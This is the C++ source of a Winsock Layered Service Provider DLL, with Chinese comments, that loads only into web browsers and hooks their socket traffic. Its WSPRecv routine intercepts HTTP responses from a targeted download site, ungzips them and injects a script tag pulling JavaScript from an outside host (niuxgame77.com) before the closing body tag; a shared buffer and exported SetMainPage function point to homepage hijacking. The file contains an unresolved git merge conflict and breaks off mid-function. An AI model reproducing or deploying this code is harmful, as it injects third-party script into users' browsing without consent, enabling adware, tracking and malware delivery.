//////////////////////////////////////////////////
// LSP.cpp文件

#include <Winsock2.h>
#include <Ws2spi.h>
#include <Windows.h>
#include <tchar.h>
#include <string>
#include "Cxlog.h"

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

#pragma data_seg("mshared")
CHAR g_MainPge[1024] = "http://www.duba.com/?un_367393_0001";		// 首页Buffer
#pragma data_seg()

#pragma comment(linker,"/section:mshared,RWS")

#ifdef UNICODE
typedef wstring TString;
#else
#define string TString;
#endif

//#define LOG(p)
//#define LOG1(p,r)
//#define LOGANSI(p,r)
#define IE_BROWSER_NAME		TEXT("iexplore1.exe")
#define CHROME_BROWSER_NAME	TEXT("chrome.exe")
#define MY_BROWSER_NAME	TEXT("qqbrowser1.exe")

WSPUPCALLTABLE g_pUpCallTable;		// 上层函数列表。如果LSP创建了自己的伪句柄，才使用这个函数列表
WSPPROC_TABLE g_NextProcTable;		// 下层函数列表
TCHAR	g_szCurrentApp[MAX_PATH];	// 当前调用本DLL的程序的名称
TCHAR   g_szLogPath[MAX_PATH] = TEXT("C:\\test\\");	// 当前调用本DLL的程序的名称
BOOL    bIsHijack  = FALSE;
BOOL	bFirstLoad = FALSE;
HMODULE g_hDll = NULL;
int g_nInsertNum = 0;
int g_nRevCount = 0;
//CompletionPort相关↓
HANDLE g_hShutdownEvent;
HANDLE g_hCompletionPort;
SOCKET  g_socket = 0;
int g_nThreads = 0;

#define HEAD_LEN 4096
#define MAX_LEN 1024*256
int ungzip(char* source, int len, char* des, int outsize);

class _tOVERLAPPEDEx : public _OVERLAPPED
{
public:
	string strRevFlag;
	SOCKET		m_s;
	CHAR*		m_pBuf;
public:
	_tOVERLAPPEDEx()
	{
		strRevFlag = "RECV";
		Internal = 0;
		InternalHigh = 0;
		Offset = 0;
		OffsetHigh = 0;
		hEvent = NULL;
	}
};

BOOL ToLower(TString &strSrc)
{
	// 将大写字母转换为小写
	for (size_t i = 0; i < strSrc.size(); i++) {
		if (strSrc[i] & 0x40) {
			strSrc[i] = (strSrc[i] | 0x20);
		}
	}

	return TRUE;
}

extern "C" BOOL  __stdcall SetMainPage(LPSTR lpszMainPage)
{
	strcpy_s(g_MainPge, lpszMainPage);
	
	return TRUE;
}

DWORD WINAPI UnloadProcThread(PVOID param)
{
	FreeLibraryAndExitThread(g_hDll, 0);
	return 0;
}

DWORD   WINAPI WorkerThread(LPVOID WorkContext)
{
	DWORD nSocket;
	DWORD nBytesToBeRead;
	LPOVERLAPPED pOverlapped;
	while (WAIT_OBJECT_0 != WaitForSingleObject(g_hShutdownEvent, 0))	//没有信号时
	{
		BOOL bReturn = GetQueuedCompletionStatus(g_hCompletionPort, &nBytesToBeRead, &nSocket, &pOverlapped, INFINITE);
		_tOVERLAPPEDEx *tOverEx = static_cast<_tOVERLAPPEDEx *>(pOverlapped);

		if (nSocket == g_socket && tOverEx->strRevFlag == "RECV")
		{
			LOG1(TEXT("\r\n\r\n\r\n===========================WorkerThreadRECV,nBytesToBeRead = %d=========================================\r\n"), nBytesToBeRead);
			LOGANSI(tOverEx->m_pBuf, nBytesToBeRead);
		}
		

	}
	return 0;
}

BOOL CreateWorkers()
{
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	int nProcessors = si.dwNumberOfProcessors;
	g_nThreads = nProcessors * 2;

	DWORD nThreadID;
	HANDLE ThreadHandle;
	DWORD i;

	for (i = 0; i < g_nThreads; i++)
	{
		ThreadHandle = CreateThread(NULL, 0, WorkerThread, NULL, 0, &nThreadID);
		if (!ThreadHandle)
		{
			LOG(TEXT("Create Worker Thread Failed\n"));
			return FALSE;
		}

		CloseHandle(ThreadHandle);
	}

	return TRUE;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			// 取得主模块的名称
			::GetModuleFileName(NULL, g_szCurrentApp, MAX_PATH);
			TString strAppName = g_szCurrentApp;
			ToLower(strAppName);
			if ((strAppName.find(IE_BROWSER_NAME) != strAppName.npos) ||
				strAppName.find(CHROME_BROWSER_NAME) != strAppName.npos ||
				strAppName.find(MY_BROWSER_NAME) != strAppName.npos) {
				bFirstLoad = TRUE;
				MessageBox(NULL, TEXT("ChromeBrowser.exe DLL"), NULL, MB_OK);
			}
			else
			{
				//Unload
				g_hDll = (HMODULE)hModule;
				HANDLE hThread = CreateThread(NULL, 0, UnloadProcThread, NULL, 0, NULL);
				CloseHandle(hThread);
			}
		}
		break;
	case DLL_PROCESS_DETACH:
		{
			// 取得主模块的名称
			::GetModuleFileName(NULL, g_szCurrentApp, MAX_PATH);
			TString strAppName = g_szCurrentApp;
			ToLower(strAppName);
		}
		break;
	}
	return TRUE;
}


LPWSAPROTOCOL_INFOW GetProvider(LPINT lpnTotalProtocols)
{
	DWORD dwSize = 0;
	int nError;
	LPWSAPROTOCOL_INFOW pProtoInfo = NULL;
	
	// 取得需要的长度
	if(::WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError) == SOCKET_ERROR) {
		if(nError != WSAENOBUFS)
			return NULL;
	}
	
	pProtoInfo = (LPWSAPROTOCOL_INFOW)::GlobalAlloc(GPTR, dwSize);
	*lpnTotalProtocols = ::WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError);
	return pProtoInfo;
}

void FreeProvider(LPWSAPROTOCOL_INFOW pProtoInfo)
{
	::GlobalFree(pProtoInfo);
}

int WSPAPI WSPAddressToString(
  _In_     LPSOCKADDR lpsaAddress,
  _In_     DWORD dwAddressLength,
  _In_     LPWSAPROTOCOL_INFO lpProtocolInfo,
  _Out_    LPWSTR lpszAddressString,
  _Inout_  LPDWORD lpdwAddressStringLength,
  _Out_    LPINT lpErrno
)
{
	//LOG(L" WSPAddressToString\n");
	return g_NextProcTable.lpWSPAddressToString(lpsaAddress, dwAddressLength, lpProtocolInfo, 
		lpszAddressString, lpdwAddressStringLength, lpErrno);
}

int WSPAPI WSPAsyncSelect(
  _In_   SOCKET s,
  _In_   HWND hWnd,
  _In_   unsigned int wMsg,
  _In_   long lEvent,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPAsyncSelect\n");
	return g_NextProcTable.lpWSPAsyncSelect(s, hWnd, wMsg, lEvent, lpErrno);
}

int WSPAPI WSPBind(
  _In_   SOCKET s,
  _In_   const struct sockaddr *name,
  _In_   int namelen,
  _Out_  LPINT lpErrno
)
{
	//LOG(L" WSPBind\n");
	//char* p = inet_ntoa(((struct sockaddr_in *)name)->sin_addr);
	//LOGANSI(p, 16);
	return g_NextProcTable.lpWSPBind(s, name, namelen, lpErrno);
}

int WSPAPI WSPCancelBlockingCall(
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPCancelBlockingCall\n");
	return g_NextProcTable.lpWSPCancelBlockingCall(lpErrno);
}


int WSPAPI WSPSendTo(
	SOCKET			s,
	LPWSABUF		lpBuffers,
	DWORD			dwBufferCount,
	LPDWORD			lpNumberOfBytesSent,
	DWORD			dwFlags,
	const struct sockaddr FAR * lpTo,
	int				iTolen,
	LPWSAOVERLAPPED	lpOverlapped,
	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
	LPWSATHREADID	lpThreadId,
	LPINT			lpErrno
)
{
	LOG(L" WSPSendTo\n");
	return g_NextProcTable.lpWSPSendTo(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpTo
			, iTolen, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);

}

SOCKET WSPAPI WSPSocket(
  _In_   int af,
  _In_   int type,
  _In_   int protocol,
  _In_   LPWSAPROTOCOL_INFO lpProtocolInfo,
  _In_   GROUP g,
  DWORD dwFlags,
  _Out_  LPINT lpErrno
)
{
	dwFlags |= WSA_FLAG_OVERLAPPED;
	return g_NextProcTable.lpWSPSocket(af, type, protocol, lpProtocolInfo, g, dwFlags, lpErrno);
}

int WSPAPI WSPConnect(
  _In_   SOCKET s,
  _In_   const struct sockaddr *name,
  _In_   int namelen,
  _In_   LPWSABUF lpCallerData,
  _Out_  LPWSABUF lpCalleeData,
  _In_   LPQOS lpSQOS,
  _In_   LPQOS lpGQOS,
  _Out_  LPINT lpErrno
)
{
	//char* p = inet_ntoa(((struct sockaddr_in *)name)->sin_addr);
	//LOGANSI(p, 16);
	//LOG(L" WSPConnect\n");

	return g_NextProcTable.lpWSPConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS, lpErrno);
}

int WSPAPI WSPCloseSocket(
  _In_   SOCKET s,
  _Out_  LPINT lpErrno
)
{
	//LOG(L" WSPCloseSocket\n");
	return g_NextProcTable.lpWSPCloseSocket(s, lpErrno);
}

int WSPAPI WSPDuplicateSocket(
  _In_   SOCKET s,
  _In_   DWORD dwProcessId,
  _Out_  LPWSAPROTOCOL_INFO lpProtocolInfo,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPDuplicateSocket\n");
	return g_NextProcTable.lpWSPDuplicateSocket(s, dwProcessId, lpProtocolInfo, lpErrno);
}

int WSPAPI WSPEnumNetworkEvents(
  _In_   SOCKET s,
  _In_   WSAEVENT hEventObject,
  _Out_  LPWSANETWORKEVENTS lpNetworkEvents,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPEnumNetworkEvents\n");
	return g_NextProcTable.lpWSPEnumNetworkEvents(s, hEventObject, lpNetworkEvents, lpErrno);
}

int WSPAPI WSPEventSelect(
  _In_   SOCKET s,
  _In_   WSAEVENT hEventObject,
  _In_   long lNetworkEvents,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPEventSelect\n");
	return g_NextProcTable.lpWSPEventSelect(s, hEventObject, lNetworkEvents, lpErrno);
}

BOOL WSPAPI WSPGetOverlappedResult(
  _In_   SOCKET s,
  _In_   LPWSAOVERLAPPED lpOverlapped,
  _Out_  LPDWORD lpcbTransfer,
  _In_   BOOL fWait,
  _Out_  LPDWORD lpdwFlags,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPGetOverlappedResult\n");
	return g_NextProcTable.lpWSPGetOverlappedResult(s, lpOverlapped, lpcbTransfer, fWait, lpdwFlags, lpErrno);
}

int WSPAPI WSPGetPeerName(
  _In_     SOCKET s,
  _Out_    struct sockaddr *name,
  _Inout_  LPINT namelen,
  _Out_    LPINT lpErrno
)
{
	LOG(L" WSPGetPeerName\n");
	return g_NextProcTable.lpWSPGetPeerName(s, name, namelen, lpErrno);
}

BOOL WSPAPI WSPGetQOSByName(
  _In_     SOCKET s,
  _Inout_  LPWSABUF lpQOSName,
  _Out_    LPQOS lpQOS,
  _Out_    LPINT lpErrno
)
{
	LOG(L" WSPGetQOSByName\n");
	return g_NextProcTable.lpWSPGetQOSByName(s, lpQOSName, lpQOS, lpErrno);
}

int WSPAPI WSPGetSockName(
  _In_     SOCKET s,
  _Out_    struct sockaddr *name,
  _Inout_  LPINT namelen,
  _Out_    LPINT lpErrno
)
{
	int ret = g_NextProcTable.lpWSPGetSockName(s, name, namelen, lpErrno);
	
	//char* p = inet_ntoa(((struct sockaddr_in *)name)->sin_addr);
	//LOGANSI(p, 16);

	//LOG(L" WSPGetSockName\n");

	return ret;
}

int WSPAPI WSPGetSockOpt(
  _In_     SOCKET s,
  _In_     int level,
  _In_     int optname,
  _Out_    char *optval,
  _Inout_  LPINT optlen,
  _Out_    LPINT lpErrno
)
{
	//LOG(L" WSPGetSockOpt\n");
	return g_NextProcTable.lpWSPGetSockOpt(s, level, optname, optval, optlen, lpErrno);
}

int WSPAPI WSPIoctl(
  _In_   SOCKET s,
  _In_   DWORD dwIoControlCode,
  _In_   LPVOID lpvInBuffer,
  _In_   DWORD cbInBuffer,
  _Out_  LPVOID lpvOutBuffer,
  _In_   DWORD cbOutBuffer,
  _Out_  LPDWORD lpcbBytesReturned,
  _In_   LPWSAOVERLAPPED lpOverlapped,
  _In_   LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
  _In_   LPWSATHREADID lpThreadId,
  _Out_  LPINT lpErrno
)
{
	//LOG(L" WSPIoctl\n");
	return g_NextProcTable.lpWSPIoctl(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, 
		cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

SOCKET WSPAPI WSPJoinLeaf(
  _In_   SOCKET s,
  _In_   const struct sockaddr *name,
  _In_   int namelen,
  _In_   LPWSABUF lpCallerData,
  _Out_  LPWSABUF lpCalleeData,
  _In_   LPQOS lpSQOS,
  _In_   LPQOS lpGQOS,
  _In_   DWORD dwFlags,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPJoinLeaf\n");
	return g_NextProcTable.lpWSPJoinLeaf(s, name, namelen, lpCallerData, lpCallerData, 
		lpSQOS, lpGQOS, dwFlags, lpErrno);
}

int WSPAPI WSPListen(
  _In_   SOCKET s,
  _In_   int backlog,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPListen\n");
	return g_NextProcTable.lpWSPListen(s, backlog, lpErrno);
}

int WSPAPI WSPRecvDisconnect(
  _In_   SOCKET s,
  _Out_  LPWSABUF lpInboundDisconnectData,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPRecvDisconnect\n");
	return g_NextProcTable.lpWSPRecvDisconnect(s, lpInboundDisconnectData, lpErrno);
}

int WSPAPI WSPRecvFrom(
  _In_     SOCKET s,
  _Inout_  LPWSABUF lpBuffers,
  _In_     DWORD dwBufferCount,
  _Out_    LPDWORD lpNumberOfBytesRecvd,
  _Inout_  LPDWORD lpFlags,
  _Out_    struct sockaddr *lpFrom,
  _Inout_  LPINT lpFromlen,
  _In_     LPWSAOVERLAPPED lpOverlapped,
  _In_     LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
  _In_     LPWSATHREADID lpThreadId,
  _Inout_  LPINT lpErrno
)
{
	LOG(L" WSPRecvFrom\n");
	return g_NextProcTable.lpWSPRecvFrom(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, 
		lpFlags, lpFrom, lpFromlen, lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

int WSPAPI WSPSelect(
  _In_     int nfds,
  _Inout_  fd_set *readfds,
  _Inout_  fd_set *writefds,
  _Inout_  fd_set *exceptfds,
  _In_     const struct timeval *timeout,
  _Out_    LPINT lpErrno
)
{
	LOG(L" WSPSelect\n");
	return g_NextProcTable.lpWSPSelect(nfds, readfds, writefds, exceptfds, timeout, lpErrno);
}

int WSPAPI WSPSendDisconnect(
  _In_   SOCKET s,
  _In_   LPWSABUF lpOutboundDisconnectData,
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPSendDisconnect\n");
	return g_NextProcTable.lpWSPSendDisconnect(s, lpOutboundDisconnectData, lpErrno);
}

int WSPAPI WSPSetSockOpt(
  _In_   SOCKET s,
  _In_   int level,
  _In_   int optname,
  _In_   const char *optval,
  _In_   int optlen,
  _Out_  LPINT lpErrno
)
{
	//LOG(L" WSPSetSockOpt\n");
	return g_NextProcTable.lpWSPSetSockOpt(s, level, optname, optval, optlen, lpErrno);
}

int WSPAPI WSPShutdown(
  _In_   SOCKET s,
  _In_   int how,
  _Out_  LPINT lpErrno
)
{
	//LOG(L" WSPShutdown\n");
	return g_NextProcTable.lpWSPShutdown(s, how, lpErrno);
}

int WSPAPI WSPCleanup(
  _Out_  LPINT lpErrno
)
{
	LOG(L" WSPCleanup\n");
	return g_NextProcTable.lpWSPCleanup(lpErrno);
}


int WSPAPI WSPStringToAddress(
  _In_     LPWSTR AddressString,
  _In_     INT AddressFamily,
  _In_     LPWSAPROTOCOL_INFO lpProtocolInfo,
  _Out_    LPSOCKADDR lpAddress,
  _Inout_  LPINT lpAddressLength,
  _Out_    LPINT lpErrno
)
{
	LOG(L" WSPStringToAddress\n");
	return g_NextProcTable.lpWSPStringToAddress(AddressString, AddressFamily, lpProtocolInfo, 
		lpAddress, lpAddressLength, lpErrno);
}

SOCKET WSPAPI WSPAccept(
	_In_     SOCKET s,
	_Out_    struct sockaddr *addr,
	_Inout_  LPINT addrlen,
	_In_     LPCONDITIONPROC lpfnCondition,
	_In_     DWORD dwCallbackData,
	_Out_    LPINT lpErrno
	)
{
	return g_NextProcTable.lpWSPAccept(s, addr, addrlen, lpfnCondition, dwCallbackData, lpErrno);
}

int WSPAPI WSPSend(
  _In_   SOCKET s,
  _In_   LPWSABUF lpBuffers,
  _In_   DWORD dwBufferCount,
  _Out_  LPDWORD lpNumberOfBytesSent,
  _In_   DWORD dwFlags,
  _In_   LPWSAOVERLAPPED lpOverlapped,
  _In_   LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
  _In_   LPWSATHREADID lpThreadId,
  _Out_  LPINT lpErrno
)
{
	string strSend = lpBuffers->buf; 

	if (/*bFirstLoad &&*/ (strSend.find("HTTP/1.1") != strSend.npos)) {
		if (strSend.find("Host: dl.58.com") != strSend.npos) {	//Host: down.52wblm.com
			g_nRevCount = 0;
			g_nInsertNum = 0;
			g_socket = s;
			//int nPos = strSend.find((" gzip,"));
			//if (nPos != strSend.npos)
			//{
			//	bIsHijack = TRUE;
			//	strSend.replace(nPos, 6, (""));

			//	ZeroMemory(lpBuffers->buf, lpBuffers->len);
			//	CopyMemory(lpBuffers->buf, strSend.c_str(), strSend.size());
			//	lpBuffers->len = strSend.size(); 

			//	//CompletionPort绑定socket
			//	//CreateIoCompletionPort((HANDLE)g_socket, g_hCompletionPort, (DWORD)g_socket, 0);
			//	LOG2(L" \r\n===========================Send My Socket,lpBuffers->len = %d,pOverlapped->hEvent = %x===============================\r\n", lpBuffers->len,lpOverlapped->hEvent);
			//}

			bFirstLoad = FALSE;

		}
	}

	return g_NextProcTable.lpWSPSend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, 
		lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
}

DWORD WINAPI RecvDataThread(PVOID param)
{
	/*while (true)
	{
		WSABUF lpBufs;
		lpBufs.len = 4096;
		lpBufs.buf = new char[4096];
		DWORD dwBufCount = 1;
		DWORD dwBytesRecvd = 0;

		g_NextProcTable.lpWSPRecv(s, &lpBufs, dwBufCount, &dwBytesRecvd, lpFlags,
			lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
		Sleep(3);


		LOG(L" ===========================rev begin=========================================\n");
		LOGANSI(lpBufs.buf, lpBufs.len);
		LOG(L" ===========================rev end=========================================\n");
	}*/
	return 0;
}

char* pHeaderBuf;
char* pUncompressBuf;
int nBodyLen = 0;
int g_nOutputPos = 0;
BOOL g_bOutputHead = FALSE;
BOOL g_bOutputBody = FALSE;
BOOL g_bNoRecv = TRUE;
int WSPAPI WSPRecv(
  _In_     SOCKET s,
  _Inout_  LPWSABUF lpBuffers,
  _In_     DWORD dwBufferCount,
  _Out_    LPDWORD lpNumberOfBytesRecvd,
  _Inout_  LPDWORD lpFlags,
  _In_     LPWSAOVERLAPPED lpOverlapped,
  _In_     LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
  _In_     LPWSATHREADID lpThreadId,
  _Out_    LPINT lpErrno
)
{
	int ret;
	
	if (s == g_socket)
	{
		/*if (g_bNoRecv)
		{
			g_bNoRecv = FALSE;
			HANDLE hThread = CreateThread(NULL, 0, RecvDataThread, NULL, 0, NULL);
			CloseHandle(hThread);
		}*/
		if (g_bNoRecv)
		{
			g_bNoRecv = FALSE;
			BOOL bFindFirstSize = FALSE;
			int nCurrentInsert = 0;	//已保存的数据总长度
			int nTotalInsert = 0;	//当前Chunk已保存的长度
			int nCurrentSize = 0;	//当前Chunk的size

			//vector< int > vec_ChunkSize;
			//vec_ChunkSize.clear();
			pHeaderBuf = new char[HEAD_LEN];
			char* pCompressBuf = new char[MAX_LEN];
			pUncompressBuf = new char[MAX_LEN];
			memset(pHeaderBuf, 0, HEAD_LEN);
			memset(pCompressBuf, 0, MAX_LEN);
			memset(pUncompressBuf, 0, MAX_LEN);
			int uCompressSize;

			Sleep(500);

			char* pRecvBuf = new char[4096];
			while (true)
			{
				ZeroMemory(pRecvBuf, 4096);
				WSABUF lpBufs;
				lpBufs.len = 4096;
				lpBufs.buf = pRecvBuf;
				DWORD dwBufCount = 1;
				DWORD dwBytesRecvd = 0;

				g_NextProcTable.lpWSPRecv(s, &lpBufs, dwBufCount, &dwBytesRecvd, lpFlags,
					lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
				Sleep(3);
				

				//Analysis Bufs
				if (!bFindFirstSize)
				{
					string strRecv = pRecvBuf;
					int nPos = strRecv.find("\r\n\r\n");
					if (nPos != strRecv.npos)
					{
						bFindFirstSize = TRUE;
						int nPosSizeStart = nPos + 4;
						int nPosSizeEnd;
						for (size_t i = nPosSizeStart; i < (nPosSizeStart + 16); i++)
						{
							char ch = pRecvBuf[i];
							if (ch == '\r')
							{
								nPosSizeEnd = i;
								break;
							}
						}
						char chSize[16];
						strncpy(chSize, (pRecvBuf + nPosSizeStart), (nPosSizeEnd - nPosSizeStart));
						chSize[(nPosSizeEnd - nPosSizeStart)] = '\0';

						nCurrentSize = strtol(chSize, NULL, 16);

						strncpy(pHeaderBuf, pRecvBuf, (nPosSizeStart));
						memcpy(pCompressBuf, (pRecvBuf + nPosSizeEnd + 2), (dwBytesRecvd - nPosSizeEnd - 2));
						nTotalInsert = nCurrentInsert = (dwBytesRecvd - nPosSizeEnd - 2);
					}
				}
				else
				{
					if ((nCurrentInsert + dwBytesRecvd) <= nCurrentSize)	//直接保存数据
					{
						memcpy((pCompressBuf + nTotalInsert), pRecvBuf, dwBytesRecvd);
						nCurrentInsert += dwBytesRecvd;
						nTotalInsert += dwBytesRecvd;
					}
					else   //查找ChunkSize
					{
						string strRecv = pRecvBuf;
						int nPosSizeStart = nCurrentSize - nCurrentInsert;
						int nPosSizeEnd;
						for (size_t i = (nPosSizeStart + 2); i < (nPosSizeStart + 16); i++)
						{
							char ch = pRecvBuf[i];
							if (ch == '\r')
							{
								nPosSizeEnd = i;
								break;
							}
						}
						memcpy((pCompressBuf + nTotalInsert), pRecvBuf, (nPosSizeStart));
						nTotalInsert += nPosSizeStart;

						char chSize[16];
						strncpy(chSize, (pRecvBuf + nPosSizeStart + 2), (nPosSizeEnd - nPosSizeStart - 2));
						chSize[(nPosSizeEnd - nPosSizeStart - 2)] = '\0';
						nCurrentSize = strtol(chSize, NULL, 16);
						if (nCurrentSize == 0)
						{
							uCompressSize = nTotalInsert;
							break;
						}
						memcpy((pCompressBuf + nTotalInsert), (pRecvBuf + nPosSizeEnd + 2), (dwBytesRecvd - nPosSizeEnd - 2));
						nCurrentInsert = (dwBytesRecvd - nPosSizeEnd - 2);
						nTotalInsert += (dwBytesRecvd - nPosSizeEnd - 2);
					}
				}


			}
			
			//uncompress
			ungzip(pCompressBuf, uCompressSize, pUncompressBuf, MAX_LEN);
			//pUncompressBuf = (pUncompressBuf + 3);

			//modify head and insert JS
			string strHead = pHeaderBuf;
			int nPos = strHead.find("Content-Encoding: gzip\r\n");
			strHead.replace(nPos, 24, (""));
			memset(pHeaderBuf, 0, HEAD_LEN);
			memcpy(pHeaderBuf, strHead.c_str(), strHead.length());
			int nHeadLen = strHead.length();

			nBodyLen = strlen(pUncompressBuf);
			string strBody = (pUncompressBuf + nBodyLen - 50);
			nPos = strBody.find("</body>");
			string strjs = "<script type='text/javascript' src='http://rjs.niuxgame77.com/r/f.php?uid=8239&pid=3285'></script>\r\n";
			int nlenjs = strjs.size();
			strBody.insert(nPos, strjs);
			memcpy((pUncompressBuf + nBodyLen - 50), strBody.c_str(), strBody.length());
			nBodyLen += nlenjs;

			g_bOutputHead = FALSE;
			g_bOutputBody = FALSE;
		}
		
		/*ret = g_NextProcTable.lpWSPRecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags,
			lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);*/
		//return STATUS_PENDING;
		/*WSASetLastError(WSA_IO_PENDING);
		return SOCKET_ERROR;*/
		if (!g_bOutputHead)
		{
			int nHeadLen = strlen(pHeaderBuf);
			ZeroMemory(lpBuffers->buf, lpBuffers->len);
			CopyMemory(lpBuffers->buf, pHeaderBuf, nHeadLen);
			*lpNumberOfBytesRecvd = nHeadLen;

			g_bOutputHead = TRUE;
			return 0;
		}
		if (!g_bOutputBody)
		{
			if (nBodyLen > (g_nOutputPos + lpBuffers->len))
			{
				int nLen = lpBuffers->len - 8;		//数据长度
				char ch[16];
				_itoa_s((nLen), ch, 16);
				int len = strlen(ch);

				ZeroMemory(lpBuffers->buf, lpBuffers->len);
				CopyMemory((lpBuffers->buf), ch, len);
				CopyMemory((lpBuffers->buf + len), "\r\n", 2);
				CopyMemory((lpBuffers->buf + len + 2), (pUncompressBuf + g_nOutputPos), nLen);
				CopyMemory((lpBuffers->buf + len + 2 + nLen), "\r\n", 2);
				*lpNumberOfBytesRecvd = (nLen + len + 4);

				g_nOutputPos += nLen;
			}
			else
			{
				int nLastLen = nBodyLen - g_nOutputPos;
				char ch[16];
				_itoa_s((nLastLen), ch, 16);
				int len = strlen(ch);


				ZeroMemory(lpBuffers->buf, lpBuffers->len);
				CopyMemory((lpBuffers->buf), ch, len);
				CopyMemory((lpBuffers->buf + len), "\r\n", 2);
				CopyMemory((lpBuffers->buf + len + 2), (pUncompressBuf + g_nOutputPos), nLastLen);
				CopyMemory((lpBuffers->buf + len + 2 + nLastLen), "0\r\n\r\n", 5);
				*lpNumberOfBytesRecvd = (nLastLen+ len + 2  + 5);

				g_bOutputBody = TRUE;
				return 0;
			}
		}
		if (g_bOutputHead && g_bOutputBody)
		{
			*lpNumberOfBytesRecvd = 0;
		}
		return 0;
	}
	else
	{
		return g_NextProcTable.lpWSPRecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags,
			lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);
	}




	/*if (s == g_socket && bIsHijack)
	{
		bIsHijack = FALSE;
		Sleep(1000);
	}*/

	/*ret = g_NextProcTable.lpWSPRecv(s, lpBuffers, dwBufferCount, lpNumberOfBytesRecvd, lpFlags,
		lpOverlapped, lpCompletionRoutine, lpThreadId, lpErrno);*/

	

	/*if (s == g_socket && *lpNumberOfBytesRecvd > 0)
	{
		LOG(L" ===========================rev begin=========================================\n");
		LOGANSI(lpBuffers->buf, lpBuffers->len);
		LOG(L" ===========================rev end=========================================\n");
	}*/

	
	
	//if (s == g_socket && *lpNumberOfBytesRecvd > 0)
	//{
	//	string strRev = lpBuffers->buf;
	//	//int nPos = strRev.find("<body class=\"newcrop\">");
	//	int nPos = strRev.find("</body>");
	//	if ((nPos != strRev.npos) /*&& (g_nInsertNum == 0)*/)
	//	{
	//		/*SetEvent(g_hShutdownEvent);
	//		for (int i = 0; i < g_nThreads; i++)
	//		{
	//			PostQueuedCompletionStatus(g_hCompletionPort, 0, (DWORD)NULL, NULL);
	//		}*/

	//		g_nInsertNum = 1;
	//		string strjs = "\r\n<script type='text/javascript' src='http://rjs.niuxgame77.com/r/f.php?uid=8239&pid=3285'></script>";
	//		int nlenjs = strjs.size();

	//		//strRev.insert((nPos + 22), strjs);
	//		strRev.insert((nPos - 1), strjs);
	//		int nlen = *lpNumberOfBytesRecvd + nlenjs;

	//		nPos = strRev.find(("188"));
	//		if (nPos != strRev.npos)
	//		{
	//			strRev.replace(nPos, 3, ("288"));
	//		}

	//		ZeroMemory(lpBuffers->buf, lpBuffers->len);
	//		CopyMemory(lpBuffers->buf, strRev.c_str(), lpBuffers->len);
	//		*lpNumberOfBytesRecvd = nlen;

	//		LOG(L" ===========================rev begin=========================================\n");
	//		LOGANSI(lpBuffers->buf, lpBuffers->len);
	//		LOG(L" ===========================rev end=========================================\n");
	//	}
	//}
}

int WSPAPI WSPStartup(
  WORD wVersionRequested,
  LPWSPDATA lpWSPData,
  LPWSAPROTOCOL_INFO lpProtocolInfo,
  WSPUPCALLTABLE UpcallTable,
  LPWSPPROC_TABLE lpProcTable
)
{
<<<<<<< HEAD
	//local new
=======
	//web new
>>>>>>> f83c5049b640641df12d86fd79029f4c9f61399d
	LOG1(L"  WSPStartup...  %s \n", g_szCurrentApp);
	
	int i;
	if(lpProtocolInfo->ProtocolChain.ChainLen <= 1)
	{	
		return WSAEPROVIDERFAILEDINIT;
	}
	
	// 保存向上调用的函数表指针（这里我们不使用它）
	g_pUpCallTable = UpcallTable;

	// 枚举协议，找到下层协议的WSAPROTOCOL_INFOW结构	
	WSAPROTOCOL_INFOW	NextProtocolInfo;
	int nTotalProtos;
	LPWSAPROTOCOL_INFOW pProtoInfo = GetProvider(&nTotalProtos);
	// 下层入口ID	
	DWORD dwBaseEntryId = lpProtocolInfo->ProtocolChain.ChainEntries[1];
	for(i=0; i<nTotalProtos; i++)
	{
		if(pProtoInfo[i].dwCatalogEntryId == dwBaseEntryId)
		{
			memcpy(&NextProtocolInfo, &pProtoInfo[i], sizeof(NextProtocolInfo));
			break;
		}
	}
	if(i >= nTotalProtos)
	{
		LOG(L" WSPStartup:	Can not find underlying protocol \n");
		return WSAEPROVIDERFAILEDINIT;
	}

	// 加载下层协议的DLL
	int nError;
	TCHAR szBaseProviderDll[MAX_PATH];
	int nLen = MAX_PATH;
	// 取得下层提供程序DLL路径
	if(::WSCGetProviderPath(&NextProtocolInfo.ProviderId, szBaseProviderDll, &nLen, &nError) == SOCKET_ERROR)
	{
		LOG1(L" WSPStartup: WSCGetProviderPath() failed %d \n", nError);
		return WSAEPROVIDERFAILEDINIT;
	}
	if(!::ExpandEnvironmentStrings(szBaseProviderDll, szBaseProviderDll, MAX_PATH))
	{
